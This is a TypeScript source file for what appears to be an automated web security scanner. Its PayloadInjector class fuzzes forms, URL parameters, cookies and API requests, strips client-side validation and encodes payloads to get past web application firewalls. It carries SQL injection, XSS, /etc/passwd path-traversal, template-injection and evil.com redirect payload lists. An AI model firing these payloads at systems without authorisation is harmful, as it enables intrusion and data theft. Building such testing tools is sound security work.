import { Logger } from '../../utils/logger/Logger';
import { LogLevel } from '../../types/enums';
import { Page } from 'playwright';
import { AttackSurface, AttackSurfaceType, InjectionContext } from './DomExplorer';
import { SPAWaitStrategy } from '../../core/timeout/SPAWaitStrategy';
import { SPAFramework } from '../../types/timeout';
import { PayloadFilter } from '../../utils/PayloadFilter';
import { getGlobalRateLimiter } from '../../core/network/RateLimiter';

/**
 * Strategie de injecție
 */
export enum InjectionStrategy {
  APPEND = 'append', // Adaugă payload la sfârșitul valorii
  REPLACE = 'replace', // Înlocuiește valoarea cu payload
  PREFIX = 'prefix', // Adaugă payload la început
  WRAP = 'wrap', // Înconjoară valoarea cu payload
}

/**
 * Encoding pentru payload-uri
 */
export enum PayloadEncoding {
  NONE = 'none',
  URL = 'url',
  HTML = 'html',
  UNICODE = 'unicode',
  BASE64 = 'base64',
  DOUBLE_URL = 'double-url',
}

/**
 * Rezultatul unei injecții
 */
export interface InjectionResult {
  payload: string;
  encoding: PayloadEncoding;
  strategy: InjectionStrategy;
  surface: AttackSurface;
  response?: {
    url: string;
    status: number;
    body: string;
    headers: Record<string, string>;
    timing: number;
  };
  error?: string;
}

/**
 * PayloadInjector - Clasa de bază pentru injecție de payload-uri
 * Responsabilități:
 * - Injectare payload-uri în diverse contexte
 * - Encoding și obfuscation
 * - Strategii de fuzzing
 * - WAF bypass techniques
 *
 * ENHANCED: Added SPA-aware waiting and longer timeouts
 * ENHANCED: Added safe mode to filter destructive payloads
 */
export class PayloadInjector {
  protected logger: Logger;
  protected spaWaitStrategy: SPAWaitStrategy;
  protected detectedFramework: SPAFramework = SPAFramework.UNKNOWN;
  protected payloadFilter: PayloadFilter;
  protected safeMode: boolean = false;

  // ENHANCED: Configurable timeouts from centralized config
  public static readonly DEFAULT_SPA_TIMEOUT = 10000; // TimeoutConfig.SPA_WAIT
  public static readonly DEFAULT_NETWORK_TIMEOUT = 10000; // TimeoutConfig.NETWORK_REQUEST

  constructor(logLevel: LogLevel = LogLevel.INFO, safeMode: boolean = false) {
    this.logger = new Logger(logLevel, 'PayloadInjector');
    this.spaWaitStrategy = new SPAWaitStrategy(logLevel);
    this.payloadFilter = new PayloadFilter(logLevel);
    this.safeMode = safeMode;

    if (this.safeMode) {
      this.logger.info('SafeMode ENABLED: Destructive payloads will be filtered');
    }
  }

  /**
   * Set safe mode
   */
  public setSafeMode(enabled: boolean): void {
    this.safeMode = enabled;
    if (this.safeMode) {
      this.logger.info('SafeMode ENABLED: Destructive payloads will be filtered');
    } else {
      this.logger.warn('SafeMode DISABLED: All payloads will be used');
    }
  }

  /**
   * Detect SPA framework for optimized waiting
   */
  public async detectSPAFramework(page: Page): Promise<SPAFramework> {
    const framework = await this.spaWaitStrategy.detectFramework(page);
    this.detectedFramework = framework;
    this.logger.info(`Detected SPA framework: ${framework}`);
    return framework;
  }

  /**
   * Injectează payload într-o suprafață de atac
   */
  public async inject(
    page: Page,
    surface: AttackSurface,
    payload: string,
    options: {
      encoding?: PayloadEncoding;
      strategy?: InjectionStrategy;
      submit?: boolean;
      baseUrl?: string;
    } = {}
  ): Promise<InjectionResult> {
    const encoding = options.encoding || PayloadEncoding.NONE;
    const strategy = options.strategy || InjectionStrategy.REPLACE;
    const submit = options.submit !== undefined ? options.submit : true;

    // Check safe mode
    if (this.safeMode && !this.payloadFilter.isSafe(payload)) {
      this.logger.warn(
        `[Inject] BLOCKED (Safe Mode): Destructive payload attempt - ` +
          `${payload.substring(0, 50)}...`
      );
      return {
        payload,
        encoding,
        strategy,
        surface,
        error: 'Payload blocked by safe mode - contains destructive operations',
      };
    }

    this.logger.info(
      `[Inject] ${surface.type}:${surface.name} <- payload (${payload.length} chars, encoding:${encoding}, strategy:${strategy})`
    );
    this.logger.debug(
      `[Inject] Raw payload: ${payload.substring(0, 100)}${payload.length > 100 ? '...' : ''}`
    );

    // Create result object early for potential early returns
    const result: InjectionResult = {
      payload,
      encoding,
      strategy,
      surface,
    };

    // Restore state if baseUrl is provided
    if (options.baseUrl) {
      try {
        // Check if page/context is still open before attempting navigation
        if (page.isClosed()) {
          this.logger.debug('Page is closed, skipping state restoration');
          result.error = 'Page closed';
          return result; // Return early with error result
        }

        const currentUrl = page.url();
        // Only reload if we are not on the base URL or if we suspect state is dirty
        // For robustness, we always reload for form inputs as they likely caused navigation
        if (surface.type === AttackSurfaceType.FORM_INPUT || currentUrl !== options.baseUrl) {
          try {
            await page.goto(options.baseUrl, { waitUntil: 'domcontentloaded', timeout: 10000 });
          } catch (e) {
            const msg = String(e);
            if (msg.includes('interrupted') || msg.includes('navigating')) {
              this.logger.debug(
                'Navigation interrupted by another navigation, waiting for it to finish...'
              );
              try {
                await page.waitForLoadState('domcontentloaded', { timeout: 5000 });
              } catch (e2) {
                this.logger.debug('Wait for interrupted navigation failed: ' + e2);
              }

              // Check if we need to navigate again
              if (page.url() !== options.baseUrl) {
                this.logger.debug('Retrying navigation to base URL...');
                await page.goto(options.baseUrl, { waitUntil: 'domcontentloaded', timeout: 10000 });
              }
            } else {
              throw e;
            }
          }

          // Wait for SPA to load and elements to be available
          if (surface.selector) {
            // Wait for the specific element to be visible (with shorter timeout)
            await page
              .waitForSelector(surface.selector, {
                state: 'visible',
                timeout: 5000,
              })
              .catch(() => {
                this.logger.debug(`Selector ${surface.selector} not found after reload`);
              });
          } else {
            // Generic wait for SPA initialization
            await page.waitForTimeout(1000);
          }
        }
      } catch (error) {
        // Check if error is due to closed page/context
        const errorMsg = String(error);
        if (errorMsg.includes('closed') || errorMsg.includes('Target closed')) {
          this.logger.debug('Page/context closed during state restoration, aborting injection');
          result.error = 'Page/context closed';
          return result; // Return early with error result
        }
        this.logger.warn(`Failed to restore state to ${options.baseUrl}: ${error}`);
      }
    }

    try {
      // Check again before starting injection (in case page closed during state restore)
      if (page.isClosed()) {
        result.error = 'Page closed before injection';
        return result;
      }

      // 1. Encode payload
      const encodedPayload = this.encodePayload(payload, encoding);
      this.logger.debug(
        `[Inject] Encoded payload: ${encodedPayload.substring(0, 100)}${encodedPayload.length > 100 ? '...' : ''}`
      );

      // 2. Apply injection strategy
      const finalPayload = this.applyStrategy(surface.value || '', encodedPayload, strategy);
      this.logger.debug(
        `[Inject] Final payload after strategy: ${finalPayload.substring(0, 100)}${finalPayload.length > 100 ? '...' : ''}`
      );

      // 3. Inject based on surface type

      // Rate Limiting
      await getGlobalRateLimiter().waitForToken();

      const startTime = Date.now();
      let apiResponse: { body: string; status: number; headers: Record<string, string> } | null =
        null;

      switch (surface.type) {
        case AttackSurfaceType.FORM_INPUT:
          await this.injectIntoFormInput(page, surface, finalPayload, submit);
          break;

        case AttackSurfaceType.URL_PARAMETER:
          const status = await this.injectIntoUrlParameter(page, surface, finalPayload);
          if (status) {
            getGlobalRateLimiter().handleResponse(status);
          }
          break;

        case AttackSurfaceType.COOKIE:
          await this.injectIntoCookie(page, surface, finalPayload);
          break;

        case AttackSurfaceType.API_PARAM:
        case AttackSurfaceType.JSON_BODY:
          apiResponse = await this.injectIntoApiRequest(page, surface, finalPayload);
          break;

        default:
          throw new Error(`Unsupported attack surface type: ${surface.type}`);
      }

      const endTime = Date.now();

      if (apiResponse) {
        getGlobalRateLimiter().handleResponse(apiResponse.status);
        result.response = {
          url: surface.metadata.url || page.url(),
          status: apiResponse.status,
          body: apiResponse.body,
          headers: apiResponse.headers,
          timing: endTime - startTime,
        };
        this.logger.debug(
          `[Inject] API Response: status=${apiResponse.status}, bodyLen=${apiResponse.body.length}, time=${endTime - startTime}ms`
        );
      } else {
        // Use SPA Wait Strategy for intelligent waiting
        const isBackgroundRequest =
          surface.type === AttackSurfaceType.API_PARAM ||
          surface.type === AttackSurfaceType.JSON_BODY;
        const context = isBackgroundRequest ? 'api' : 'navigation';
        const timeout = isBackgroundRequest ? 2000 : PayloadInjector.DEFAULT_NETWORK_TIMEOUT;

        await this.spaWaitStrategy.waitForStability(page, timeout, context);

        const body = await page.content();
        result.response = {
          url: page.url(),
          status: 200, // Will be updated from network monitoring
          body: body,
          headers: {},
          timing: endTime - startTime,
        };
        this.logger.info(
          `[Inject] Page Response: url=${page.url()}, bodyLen=${body.length}, time=${endTime - startTime}ms`
        );
      }
    } catch (error) {
      const errorMsg = String(error);
      // Silently skip closed page errors (test was aborted)
      if (errorMsg.includes('closed') || errorMsg.includes('Target closed')) {
        this.logger.debug(`Injection aborted (page closed): ${surface.name}`);
      } else {
        this.logger.debug(`Injection skipped (element unavailable): ${error}`);
      }
      result.error = errorMsg;
    }

    return result;
  }

  /**
   * Inject into API Request (XHR/Fetch)
   */
  private async injectIntoApiRequest(
    page: Page,
    surface: AttackSurface,
    payload: string
  ): Promise<{ body: string; status: number; headers: Record<string, string> }> {
    const url = surface.metadata.url;
    if (!url) {
      throw new Error('URL missing in attack surface metadata');
    }

    const method = (surface.metadata['method'] as string) || 'GET';
    const originalHeaders = (surface.metadata['headers'] as Record<string, string>) || undefined;

    let response;

    if (surface.type === AttackSurfaceType.API_PARAM) {
      const apiUrl = new URL(url);
      apiUrl.searchParams.set(surface.name, payload);
      const headers = this.sanitizeReplayHeaders(originalHeaders);
      response = await page.request.fetch(apiUrl.toString(), {
        method,
        headers,
      });
    } else if (surface.type === AttackSurfaceType.JSON_BODY) {
      const originalBody = surface.metadata['originalBody'];
      if (!originalBody) {
        throw new Error('Original body missing for JSON injection');
      }

      const body = JSON.parse(JSON.stringify(originalBody)); // Deep clone
      const key = surface.metadata['originalKey'] as string;

      if (key) {
        this.setNestedValue(body, key, payload);
      }

      // ENHANCEMENT: Log JSON injection details
      this.logger.debug(`[JSON Injection] URL: ${url}`);
      this.logger.debug(`[JSON Injection] Key: ${key} = ${payload.substring(0, 50)}...`);
      this.logger.debug(`[JSON Injection] Body: ${JSON.stringify(body).substring(0, 200)}...`);

      const replayHeaders = {
        ...this.sanitizeReplayHeaders(originalHeaders),
        'Content-Type': 'application/json',
      };

      response = await page.request.fetch(url, {
        method,
        data: body,
        headers: replayHeaders,
      });
    }

    if (!response) throw new Error('Failed to send API request');

    return {
      body: await response.text(),
      status: response.status(),
      headers: response.headers(),
    };
  }

  /**
   * Sanitize captured headers for API replay.
   *
   * Playwright's request client may reject or mis-handle hop-by-hop / computed headers.
   * We keep auth/session-relevant headers (Authorization, Cookie, etc.) and drop the rest.
   */
  private sanitizeReplayHeaders(
    headers?: Record<string, string>
  ): Record<string, string> | undefined {
    if (!headers || Object.keys(headers).length === 0) return undefined;

    const blocked = new Set([
      'host',
      'content-length',
      'connection',
      'keep-alive',
      'proxy-authenticate',
      'proxy-authorization',
      'te',
      'trailers',
      'transfer-encoding',
      'upgrade',
      'sec-fetch-site',
      'sec-fetch-mode',
      'sec-fetch-dest',
      'sec-fetch-user',
      'sec-ch-ua',
      'sec-ch-ua-mobile',
      'sec-ch-ua-platform',
      'accept-encoding',
      // 'origin', // Allow Origin for API replay
      // 'referer', // Allow Referer for API replay
    ]);

    const sanitized: Record<string, string> = {};
    for (const [key, value] of Object.entries(headers)) {
      const lowerKey = key.toLowerCase();
      if (blocked.has(lowerKey)) continue;
      if (typeof value !== 'string' || value.trim().length === 0) continue;
      sanitized[key] = value;
    }

    return Object.keys(sanitized).length > 0 ? sanitized : undefined;
  }

  /**
   * Helper to set nested JSON value
   */
  private setNestedValue(obj: any, path: string, value: any) {
    const keys = path.split('.');
    let current = obj;
    for (let i = 0; i < keys.length - 1; i++) {
      const key = keys[i];
      if (key) {
        if (!current[key]) current[key] = {};
        current = current[key];
      }
    }
    const lastKey = keys[keys.length - 1];
    if (lastKey) {
      current[lastKey] = value;
    }
  }

  /**
   * Injectează multiple payload-uri într-o suprafață
   * PERFORMANCE FIX: Support concurrent injection with proper concurrency control
   */
  public async injectMultiple(
    page: Page,
    surface: AttackSurface,
    payloads: string[],
    options: {
      encoding?: PayloadEncoding;
      encodings?: PayloadEncoding[];
      strategy?: InjectionStrategy;
      submit?: boolean;
      delayMs?: number;
      baseUrl?: string;
      maxConcurrent?: number;
    } = {}
  ): Promise<InjectionResult[]> {
    this.logger.info(
      `[InjectMultiple] ${surface.type}:${surface.name} <- ${payloads.length} payloads`
    );
    const results: InjectionResult[] = [];

    // PERFORMANCE FIX: Reduce default delay and increase concurrency
    // Old default: 100ms delay, 1 concurrent
    // New default: 50ms delay (or 0 for API requests), higher concurrency for API
    const isApiRequest =
      surface.type === AttackSurfaceType.API_PARAM || surface.type === AttackSurfaceType.JSON_BODY;
    const delayMs = options.delayMs ?? (isApiRequest ? 0 : 50);
    const maxConcurrent = Math.max(1, options.maxConcurrent ?? (isApiRequest ? 3 : 1));

    this.logger.debug(`[InjectMultiple] Concurrency: ${maxConcurrent}, Delay: ${delayMs}ms`);

    for (let i = 0; i < payloads.length; i += maxConcurrent) {
      const batch = payloads.slice(i, i + maxConcurrent);
      const batchPromises = batch.map((payload, batchIndex) => {
        const globalIndex = i + batchIndex;
        if (!payload) return Promise.resolve(null);
        const encoding =
          options.encodings?.[globalIndex] || options.encoding || PayloadEncoding.NONE;
        return this.inject(page, surface, payload, {
          ...options,
          encoding,
        });
      });

      const batchResults = await Promise.all(batchPromises);
      batchResults.filter(Boolean).forEach((res) => results.push(res as InjectionResult));

      if (i + maxConcurrent < payloads.length && delayMs > 0) {
        await this.delay(delayMs);
      }
    }

    return results;
  }

  /**
   * Encode payload based on strategy
   */
  protected encodePayload(payload: string, encoding: PayloadEncoding): string {
    switch (encoding) {
      case PayloadEncoding.URL:
        return encodeURIComponent(payload);

      case PayloadEncoding.DOUBLE_URL:
        return encodeURIComponent(encodeURIComponent(payload));

      case PayloadEncoding.HTML:
        return payload
          .replace(/&/g, '&amp;')
          .replace(/</g, '&lt;')
          .replace(/>/g, '&gt;')
          .replace(/"/g, '&quot;')
          .replace(/'/g, '&#x27;');

      case PayloadEncoding.UNICODE:
        return this.unicodeEncode(payload);

      case PayloadEncoding.BASE64:
        return Buffer.from(payload).toString('base64');

      case PayloadEncoding.NONE:
      default:
        return payload;
    }
  }

  /**
   * Unicode encoding for WAF bypass
   */
  private unicodeEncode(payload: string): string {
    return payload
      .split('')
      .map((char) => {
        // Randomly choose between normal, hex, and unicode encoding
        const rand = Math.random();
        if (rand < 0.7) {
          return char; // Keep normal
        } else if (rand < 0.85) {
          return `\\x${char.charCodeAt(0).toString(16).padStart(2, '0')}`; // Hex
        } else {
          return `\\u${char.charCodeAt(0).toString(16).padStart(4, '0')}`; // Unicode
        }
      })
      .join('');
  }

  /**
   * Apply injection strategy
   */
  private applyStrategy(original: string, payload: string, strategy: InjectionStrategy): string {
    switch (strategy) {
      case InjectionStrategy.APPEND:
        return original + payload;

      case InjectionStrategy.PREFIX:
        return payload + original;

      case InjectionStrategy.WRAP:
        return payload + original + payload;

      case InjectionStrategy.REPLACE:
      default:
        return payload;
    }
  }

  /**
   * Inject into form input
   */
  private async injectIntoFormInput(
    page: Page,
    surface: AttackSurface,
    payload: string,
    submit: boolean
  ): Promise<void> {
    // Bypass client-side validation by modifying DOM
    if (surface.element) {
      await surface.element
        .evaluate((el: any) => {
          el.removeAttribute('required');
          el.removeAttribute('pattern');
          el.removeAttribute('minlength');
          el.removeAttribute('maxlength');
          if (el.type === 'email' || el.type === 'url' || el.type === 'number') {
            el.type = 'text'; // Force to text to accept any payload
          }
        })
        .catch(() => {});
    }

    // Also try to modify via selector if element is not available
    if (surface.selector) {
      await page
        .evaluate((selector) => {
          const el = document.querySelector(selector) as HTMLInputElement;
          if (el) {
            el.removeAttribute('required');
            el.removeAttribute('pattern');
            el.removeAttribute('minlength');
            el.removeAttribute('maxlength');
            if (el.type === 'email' || el.type === 'url' || el.type === 'number') {
              el.type = 'text';
            }
          }
        }, surface.selector)
        .catch(() => {});
    }

    // Prioritize selector to avoid detached elements after reload
    if (surface.selector) {
      await page.fill(surface.selector, payload);
    } else if (surface.element) {
      await surface.element.fill(payload);
    } else {
      throw new Error('No element or selector available for injection');
    }

    // Fill other fields if specified in metadata
    if (surface.metadata?.['otherFields']) {
      const otherFields = surface.metadata['otherFields'] as Record<string, string>;
      for (const [selector, value] of Object.entries(otherFields)) {
        try {
          // Wait for element to be visible before filling
          await page.waitForSelector(selector, { state: 'visible', timeout: 2000 }).catch(() => {});
          await page.fill(selector, value);
          this.logger.debug(`Filled other field: ${selector} = ${value}`);
        } catch (e) {
          this.logger.warn(`Failed to fill other field ${selector}: ${e}`);
        }
      }
    }

    // Submit the form if requested
    if (submit) {
      // Try multiple methods to submit
      let submitted = false;

      // Method 1: Click submit button (various selectors)
      const submitSelectors = [
        'button[type="submit"]',
        'input[type="submit"]',
        'button:has-text("Log in")',
        'button:has-text("Login")',
        'button:has-text("Sign in")',
        'button:has-text("Submit")',
        'button[id*="login"]',
        'button[id*="submit"]',
        '#loginButton',
        'mat-card-actions button', // Angular Material
        'form button:not([type="button"])',
      ];

      for (const selector of submitSelectors) {
        try {
          const submitBtn = await page.$(selector);
          if (submitBtn && (await submitBtn.isVisible())) {
            // Force enable button
            await submitBtn
              .evaluate((el: any) => {
                el.removeAttribute('disabled');
                el.classList.remove('disabled');
              })
              .catch(() => {});

            await submitBtn.click({ timeout: 2000 });
            submitted = true;
            this.logger.debug(`Submitted form using selector: ${selector}`);
            break;
          }
        } catch (e) {
          // Try next selector
        }
      }

      // Method 2: Press Enter on the input
      if (!submitted) {
        try {
          if (surface.selector) {
            await page.press(surface.selector, 'Enter');
            submitted = true;
            this.logger.debug('Submitted form using Enter key');
          }
        } catch (e) {
          // Ignore
        }
      }

      // Wait for form submission to complete
      if (submitted) {
        await page.waitForTimeout(300); // Brief wait for SPA state update
        await page.waitForLoadState('networkidle', { timeout: 2000 }).catch(() => {});
      }
    }
  }

  /**
   * Inject into URL parameter
   */
  private async injectIntoUrlParameter(
    page: Page,
    surface: AttackSurface,
    payload: string
  ): Promise<number | null> {
    const currentUrl = new URL(page.url());
    currentUrl.searchParams.set(surface.name, payload);
    const response = await page.goto(currentUrl.toString(), { waitUntil: 'domcontentloaded' });
    return response ? response.status() : null;
  }

  /**
   * Inject into cookie
   */
  private async injectIntoCookie(
    page: Page,
    surface: AttackSurface,
    payload: string
  ): Promise<void> {
    await page.context().addCookies([
      {
        name: surface.name,
        value: payload,
        domain: surface.metadata['domain'] as string,
        path: (surface.metadata['path'] as string) || '/',
        secure: (surface.metadata['secure'] as boolean) || false,
        httpOnly: (surface.metadata['httpOnly'] as boolean) || false,
        sameSite: (surface.metadata['sameSite'] as 'Strict' | 'Lax' | 'None') || 'Lax',
      },
    ]);

    // Reload page to apply cookie
    await page.reload({ waitUntil: 'domcontentloaded' });
  }

  /**
   * Generate fuzzing payloads based on context
   */
  public generateFuzzingPayloads(context: InjectionContext, count: number = 10): string[] {
    const payloads: string[] = [];

    switch (context) {
      case InjectionContext.SQL:
        payloads.push(...this.getSqlFuzzPayloads().slice(0, count));
        break;

      case InjectionContext.HTML:
      case InjectionContext.JAVASCRIPT:
        payloads.push(...this.getXssFuzzPayloads().slice(0, count));
        break;

      case InjectionContext.URL:
        payloads.push(...this.getUrlFuzzPayloads().slice(0, count));
        break;

      default:
        payloads.push(...this.getGenericFuzzPayloads().slice(0, count));
    }

    // Apply safe mode filtering
    if (this.safeMode) {
      return this.payloadFilter.filterPayloads(payloads);
    }

    return payloads;
  }

  /**
   * SQL fuzzing payloads
   */
  private getSqlFuzzPayloads(): string[] {
    return [
      "'",
      '"',
      '`',
      "' OR '1'='1",
      "' OR 1=1--",
      "' OR 'a'='a",
      "admin'--",
      "admin' #",
      "admin'/*",
      "' UNION SELECT NULL--",
      "' AND SLEEP(5)--",
      "1' AND '1'='2",
    ];
  }

  /**
   * XSS fuzzing payloads
   */
  private getXssFuzzPayloads(): string[] {
    return [
      '<script>alert(1)</script>',
      '<img src=x onerror=alert(1)>',
      '<svg/onload=alert(1)>',
      'javascript:alert(1)',
      '<iframe src="javascript:alert(1)">',
      '"><script>alert(1)</script>',
      "'-alert(1)-'",
      '<body onload=alert(1)>',
    ];
  }

  /**
   * URL fuzzing payloads
   */
  private getUrlFuzzPayloads(): string[] {
    return [
      '../../../etc/passwd',
      '....//....//....//etc/passwd',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      'file:///etc/passwd',
      'http://evil.com',
    ];
  }

  /**
   * Generic fuzzing payloads
   */
  private getGenericFuzzPayloads(): string[] {
    return [
      'A'.repeat(1000), // Buffer overflow
      '%00', // Null byte
      '${7*7}', // Template injection
      '{{7*7}}', // Template injection
      '\x00\x01\x02', // Binary data
      '../../../', // Path traversal
      '<>"\';', // Special characters
    ];
  }

  /**
   * Delay helper
   */
  private delay(ms: number): Promise<void> {
    return new Promise((resolve) => setTimeout(resolve, ms));
  }
}
